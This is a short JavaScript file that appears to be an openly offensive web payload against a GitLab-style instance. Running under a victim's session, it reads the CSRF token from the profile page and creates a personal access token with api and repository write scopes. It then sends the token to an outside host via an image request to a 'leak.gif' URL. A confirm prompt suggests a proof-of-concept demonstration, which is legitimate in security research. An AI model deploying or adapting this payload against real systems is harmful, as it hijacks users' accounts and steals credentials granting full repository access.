async function getToken() {
  
  const response1 = await fetch(
    "https://65.52.77.188/-/profile/personal_access_tokens",
    {
      credentials: "include",
      method: "GET",
      mode: "cors"
    }
  );

  const formData = new FormData();

  const parser1 = new DOMParser();
  const doc1 = parser1.parseFromString(await response1.text(), "text/html");
  
  formData.append(
    'authenticity_token',
    doc1.querySelector('meta[name="csrf-token"]').content
  );

  formData.append("personal_access_token[name]", "test");
  formData.append("personal_access_token[scopes][]", "api");
  formData.append("personal_access_token[scopes][]", "read_repository");
  formData.append("personal_access_token[scopes][]", "write_repository");
  formData.append("personal_access_token[scopes][]", "write_registry");

  const response2 = await fetch(
    "https://65.52.77.188/-/profile/personal_access_tokens",
    {
      credentials: "include",
      body: formData,
      method: "POST",
      mode: "cors"
    }
  )

  const parser2 = new DOMParser();
  const doc2 = parser1.parseFromString(await response2.text(), "text/html");
  return doc2.querySelector("#created-personal-access-token").value;
}


if (confirm("Create an access token?")) {
  getToken().then(token => {
    alert("Created token is: " + token);
    const image = new Image();
    image.src = `//aw.rs/g/leak.gif?token=${token}`;
  });
}
